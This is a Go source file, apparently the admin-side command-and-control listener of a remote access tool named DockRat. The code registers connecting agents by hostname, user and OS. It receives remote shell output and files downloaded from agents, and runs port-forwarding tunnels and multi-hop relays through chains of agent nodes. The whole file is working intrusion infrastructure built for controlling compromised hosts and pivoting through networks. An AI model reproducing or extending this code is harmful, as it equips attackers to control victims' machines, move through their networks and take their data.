package network

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"

	"github.com/Singert/DockRat/core/node"
	"github.com/Singert/DockRat/core/protocol"
)

// -------------------------- admin专用的监听函数 -------------------------

func StartListener(addr string, registry *node.Registry) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatalf("[!] Failed to listen on %s: %v", addr, err)
	}
	log.Printf("[+] Listening on %s", addr)

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Println("[!] Accept error:", err)
			continue
		}
		go handleConnection(conn, registry)
	}
}

func handleConnection(conn net.Conn, registry *node.Registry) {
	log.Printf("[+] New connection from %s", conn.RemoteAddr())

	lengthBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
		log.Println("[!] Failed to read message length:", err)
		conn.Close()
		return
	}
	length := bytesToUint32(lengthBuf)
	data := make([]byte, length)
	if _, err := io.ReadFull(conn, data); err != nil {
		log.Println("[!] Failed to read message body:", err)
		conn.Close()
		return
	}

	msg, err := protocol.DecodeMessage(data)
	if err != nil {
		log.Println("[!] Failed to decode message:", err)
		conn.Close()
		return
	}

	if msg.Type == protocol.MsgHandshake {
		var payload protocol.HandshakePayload
		if err := json.Unmarshal(msg.Payload, &payload); err != nil {
			log.Println("[!] Failed to decode handshake payload:", err)
			conn.Close()
			return
		}

		n := &node.Node{
			Conn:     conn,
			Hostname: payload.Hostname,
			Username: payload.Username,
			OS:       payload.OS,
			Addr:     conn.RemoteAddr().String(),
		}
		id := registry.Add(n)
		log.Printf("[+] Registered agent ID %d - %s@%s (%s)", id, n.Username, n.Hostname, n.OS)
		protocol.PrintPrompt()
		protocol.Registry = registry
		go handleAgentMessages(n, registry)
	} else {
		log.Println("[!] Unknown message type:", msg.Type)
		protocol.PrintPrompt()
		conn.Close()
	}
}

func handleAgentMessages(n *node.Node, registry *node.Registry) {
	conn := n.Conn
	for {
		lengthBuf := make([]byte, 4)
		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
			log.Printf("[-] Node %d disconnected: %v", n.ID, err)
			registry.Remove(n.ID)
			conn.Close()
			return
		}
		length := bytesToUint32(lengthBuf)
		data := make([]byte, length)
		if _, err := io.ReadFull(conn, data); err != nil {
			log.Printf("[-] Node %d read failed: %v", n.ID, err)
			registry.Remove(n.ID)
			conn.Close()
			return
		}

		msg, err := protocol.DecodeMessage(data)
		if err != nil {
			log.Printf("[-] Node %d decode failed: %v", n.ID, err)
			continue
		}

		switch msg.Type {
		case protocol.MsgResponse:
			log.Printf("[#] Node %d response:\n%s", n.ID, string(msg.Payload))
			protocol.PrintPrompt()
		case protocol.MsgShell:
			fmt.Print(string(msg.Payload))

		// ------ Forward逻辑 ------

		case protocol.MsgForwardData:
			var payload protocol.ForwardDataPayload
			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
				log.Printf("[-] ForwardData decode failed: %v", err)
				break
			}
			conn, ok := protocol.GetForwardConn(payload.ConnID)
			if !ok {
				log.Printf("[-] ForwardConn %s not found", payload.ConnID)
				break
			}
			_, err := conn.Write(payload.Data)
			if err != nil {
				log.Printf("[-] ForwardConn %s write failed: %v", payload.ConnID, err)
				conn.Close()
				protocol.RemoveForwardConn(payload.ConnID)
			}

		case protocol.MsgForwardStop:
			var payload protocol.ForwardStopPayload
			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
				log.Printf("[-] ForwardStop decode failed: %v", err)
				break
			}
			conn, ok := protocol.GetForwardConn(payload.ConnID)
			if ok {
				conn.Close()
				protocol.RemoveForwardConn(payload.ConnID)
				log.Printf("[+] ForwardConn %s closed by agent", payload.ConnID)
			}

		// ------ Backward逻辑 ------
		case protocol.MsgBackwardStart:
			var payload protocol.BackwardStartPayload
			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
				log.Printf("[-] BackwardStart decode failed: %v", err)
				break
			}
			go protocol.HandleBackwardStart(payload.ConnID) // ✨注意用 goroutine 异步处理
		case protocol.MsgBackwardData:
			var payload protocol.BackwardDataPayload
			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
				log.Printf("[-] BackwardData decode failed: %v", err)
				break
			}
			log.Printf("[admin] ← MsgBackwardData for connID=%s, data.len=%d", payload.ConnID, len(payload.Data))

			conn, ok := protocol.GetBackwardConn(payload.ConnID)
			if !ok {
				log.Printf("[-] BackwardConn %s not found", payload.ConnID)
				break
			}
			_, err := conn.Write(payload.Data)
			if err != nil {
				log.Printf("[-] BackwardConn %s write failed: %v", payload.ConnID, err)
				conn.Close()
				protocol.RemoveBackwardConn(payload.ConnID)
			}

		case protocol.MsgBackwardStop:
			connID := string(msg.Payload) // agent 直接发送 connID 字符串
			conn, ok := protocol.GetBackwardConn(connID)
			if ok {
				conn.Close()
				protocol.RemoveBackwardConn(connID)
				log.Printf("[+] BackwardConn %s closed by agent", connID)
			}
			break

		case protocol.MsgRelayReady:
			var payload protocol.RelayReadyPayload
			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
				log.Printf("[-] RelayReady decode failed: %v", err)
				protocol.PrintPrompt()
				return
			}

			log.Printf("[Relay Ready] Node %d (%s) is now acting as relay ", payload.SelfID, payload.ListenAddr)
			protocol.PrintPrompt()
		case protocol.MsgFileChunk:
			var chunk protocol.FileChunk
			if err := json.Unmarshal(msg.Payload, &chunk); err != nil {
				log.Printf("[-] FileChunk decode failed: %v", err)
				protocol.PrintPrompt()
				return
			}
			protocol.OnFileChunk(chunk.Offset, chunk.Data)

		case protocol.MsgDownloadDone:
			log.Print("[+] Download complete.")
			protocol.PrintPrompt()
			protocol.OnDownloadDone()

		case protocol.MsgRelayRegister:
			var payload protocol.RelayRegisterPayload
			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
				log.Printf("[-] RelayRegister decode failed: %v", err)
				protocol.PrintPrompt()
				return
			}

			newNode := payload.Node
			newID := newNode.ID

			// 检查是否冲突
			if _, exists := registry.Get(newID); exists {
				log.Printf("[-] Duplicate node ID %d rejected", newID)
				protocol.PrintPrompt()
				resp := protocol.RelayAckPayload{Success: false, Message: "ID already exists"}
				sendAck(n.Conn, protocol.MsgRelayError, resp)
				return
			}

			// 注册
			registry.AddWithID(&newNode)
			registry.NodeGraph.SetParent(newID, payload.ParentID)
			log.Printf("[+] Registered relayed node ID %d under parent %d", newID, payload.ParentID)
			protocol.PrintPrompt()
			resp := protocol.RelayAckPayload{Success: true, Message: "Registered"}
			sendAck(n.Conn, protocol.MsgRelayAck, resp)

		case protocol.MsgRelayPacket:
			var pkt protocol.RelayPacket
			if err := json.Unmarshal(msg.Payload, &pkt); err != nil {
				log.Printf("[-] RelayPacket decode failed: %v", err)
				protocol.PrintPrompt()
				return
			}
			log.Printf("[admin] RelayPacket received: dest=%d, data.len=%d", pkt.DestID, len(pkt.Data))
			// ✅ 特殊情况：目标是 admin 本人（DestID == -1）
			if pkt.DestID == -1 {
				innerMsg, err := protocol.DecodeMessage(pkt.Data)
				if err != nil {
					log.Printf("[-] Failed to decode inner message to admin: %v", err)
					protocol.PrintPrompt()
					return
				}
				switch innerMsg.Type {
				case protocol.MsgRelayRegister:
					var payload protocol.RelayRegisterPayload
					if err := json.Unmarshal(innerMsg.Payload, &payload); err != nil {
						log.Printf("[-] RelayRegister decode failed: %v", err)
						protocol.PrintPrompt()
						return
					}
					newNode := payload.Node
					newID := newNode.ID

					if _, exists := registry.Get(newID); exists {
						log.Printf("[-] Duplicate node ID %d rejected", newID)
						protocol.PrintPrompt()
						resp := protocol.RelayAckPayload{Success: false, Message: "ID already exists"}
						sendAck(n.Conn, protocol.MsgRelayError, resp)
						return
					}

					registry.AddWithID(&newNode)
					registry.NodeGraph.SetParent(newID, payload.ParentID)
					log.Printf("[+] Registered relayed node ID %d under parent %d", newID, payload.ParentID)
					protocol.PrintPrompt()
					resp := protocol.RelayAckPayload{Success: true, Message: "Registered"}
					sendAck(n.Conn, protocol.MsgRelayAck, resp)

				default:
					log.Printf("[-] Unknown message type sent to admin: %s", innerMsg.Type)
					protocol.PrintPrompt()
					protocol.PrintPrompt()
				}
				return // ❗重要：处理完后不要再继续下发
			}

			// ✅ 正常 relay 处理流程
			innerMsg, err := protocol.DecodeMessage(pkt.Data)
			if err != nil {
				log.Printf("[-] Failed to decode inner message: %v", err)
				protocol.PrintPrompt()
				return
			}

			switch innerMsg.Type {
			case protocol.MsgResponse:
				log.Printf("[#] Node %d response:\n%s", pkt.DestID, string(innerMsg.Payload))
				protocol.PrintPrompt()
			case protocol.MsgShell:
				fmt.Print(string(innerMsg.Payload))
				protocol.PrintPrompt()
			case protocol.MsgFileChunk:
				fmt.Println("[+] Received file chunk from node", pkt.DestID)
				var chunk protocol.FileChunk
				if err := json.Unmarshal(innerMsg.Payload, &chunk); err != nil {
					log.Println("[-] FileData decode failed:", err)
					protocol.PrintPrompt()
					return
				}
				protocol.OnFileChunk(chunk.Offset, chunk.Data)

			case protocol.MsgDownloadDone:
				log.Print("[+] Download complete.")
				protocol.PrintPrompt()
				protocol.OnDownloadDone()

			// ------ Forward逻辑 ------

			case protocol.MsgForwardData:
				var payload protocol.ForwardDataPayload
				if err := json.Unmarshal(innerMsg.Payload, &payload); err != nil {
					log.Printf("[-] ForwardData decode failed: %v", err)
					break
				}
				conn, ok := protocol.GetForwardConn(payload.ConnID)
				if !ok {
					log.Printf("[-] ForwardConn %s not found", payload.ConnID)
					break
				}
				_, err := conn.Write(payload.Data)
				if err != nil {
					log.Printf("[-] ForwardConn %s write failed: %v", payload.ConnID, err)
					conn.Close()
					protocol.RemoveForwardConn(payload.ConnID)
				}

			case protocol.MsgForwardStop:
				var payload protocol.ForwardStopPayload
				if err := json.Unmarshal(innerMsg.Payload, &payload); err != nil {
					log.Printf("[-] ForwardStop decode failed: %v", err)
					break
				}
				conn, ok := protocol.GetForwardConn(payload.ConnID)
				if ok {
					conn.Close()
					protocol.RemoveForwardConn(payload.ConnID)
					log.Printf("[+] ForwardConn %s closed by agent", payload.ConnID)
				}

				// ------ Backward逻辑 ------

			case protocol.MsgBackwardStart:
				var payload protocol.BackwardStartPayload
				if err := json.Unmarshal(innerMsg.Payload, &payload); err != nil {
					log.Printf("[-] BackwardStart decode failed: %v", err)
					break
				}
				protocol.HandleBackwardStart(payload.ConnID) // ✨注意用 goroutine 异步处理
			case protocol.MsgBackwardData:
				var payload protocol.BackwardDataPayload
				if err := json.Unmarshal(innerMsg.Payload, &payload); err != nil {
					log.Printf("[-] BackwardData decode failed: %v", err)
					break
				}
				log.Printf("[admin] ← MsgBackwardData for connID=%s, data.len=%d", payload.ConnID, len(payload.Data))

				conn, ok := protocol.GetBackwardConn(payload.ConnID)
				if !ok {
					log.Printf("[-] BackwardConn %s not found", payload.ConnID)
					break
				}

				_, err := conn.Write(payload.Data)
				if err != nil {
					log.Printf("[-] BackwardConn %s write failed: %v", payload.ConnID, err)
					conn.Close()
					protocol.RemoveBackwardConn(payload.ConnID)
				}

			case protocol.MsgBackwardStop:
				connID := string(innerMsg.Payload) // agent 直接发送 connID 字符串
				conn, ok := protocol.GetBackwardConn(connID)
				if ok {
					conn.Close()
					protocol.RemoveBackwardConn(connID)
					log.Printf("[+] BackwardConn %s closed by agent", connID)
				}

			default:
				// 向下 relay：找父节点继续下发
				parentID := registry.NodeGraph.GetParent(pkt.DestID)
				if parentID == -1 {
					log.Printf("[-] No parent found for dest ID %d", pkt.DestID)
					protocol.PrintPrompt()
					return
				}
				parentNode, ok := registry.Get(parentID)
				if !ok || parentNode.Conn == nil {
					log.Printf("[-] Cannot forward to %d: no relay node found", pkt.DestID)
					protocol.PrintPrompt()
					return
				}
				fwdMsg := protocol.Message{
					Type:    protocol.MsgRelayPacket,
					Payload: msg.Payload, // 原始封装即可
				}
				buf, err := protocol.EncodeMessage(fwdMsg)
				if err != nil {
					log.Printf("[-] Failed to encode relay forward: %v", err)
					protocol.PrintPrompt()
					return
				}
				_, err = parentNode.Conn.Write(buf)
				if err != nil {
					log.Printf("[-] Failed to relay to %d via %d: %v", pkt.DestID, parentID, err)
					protocol.PrintPrompt()
				}
			}

		default:
			log.Printf("[-] Node %d sent unknown message type: %s", n.ID, msg.Type)
			protocol.PrintPrompt()
		}
	}
}
func sendAck(conn net.Conn, msgType protocol.MessageType, ack protocol.RelayAckPayload) {
	data, _ := json.Marshal(ack)
	msg := protocol.Message{
		Type:    msgType,
		Payload: data,
	}
	buf, _ := protocol.EncodeMessage(msg)
	conn.Write(buf)
}
